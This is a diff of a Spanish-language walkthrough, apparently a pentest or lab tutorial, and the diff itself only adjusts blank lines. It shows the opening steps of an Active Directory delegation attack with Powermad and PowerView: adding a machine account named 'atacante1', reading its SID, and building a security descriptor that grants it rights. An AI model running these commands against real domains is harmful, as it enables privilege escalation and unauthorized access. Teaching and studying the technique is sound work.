@@ -165,15 +165,18 @@ import-module .\powermad.ps1
 import-module .\PowerView.ps1
 ```
 Primero, necesitamos crear un computador llamado atacante1 con la contraseña Password123!:
+
 ```
 New-MachineAccount -MachineAccount atacante1 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
-
 [+] Machine account atacante1 added
 ```
+
 Luego obtenemos el SID del computador creado:
+
 ```
 $ComputerSid = Get-DomainComputer atacante1 -Properties objectsid | Select -Expand objectsid
 ```
+
 Luego construimos un ACE generico con el SID del computador creado, despues obteniendo los bytes para el nuevo DACL/ACE:
 ```
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
